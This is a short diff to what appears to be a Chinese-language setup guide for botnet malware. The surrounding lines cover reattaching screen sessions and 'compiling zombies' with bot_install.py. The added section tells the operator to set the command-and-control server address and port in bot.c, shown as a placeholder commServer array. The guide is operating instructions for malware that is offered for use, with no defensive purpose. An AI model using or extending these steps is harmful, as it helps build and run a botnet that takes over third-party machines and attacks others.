@@ -26,6 +26,14 @@ screen -ls
 然后
 screen -r 会话名
 ```
+## 更换bot.c的cnc 地址和端口
+```c
+bot.c:
+
+
+unsigned char *commServer[] = {"ip:port", "ip:port"};
+
+```
 ## 编译僵尸
 ```python
 python bot_install.py
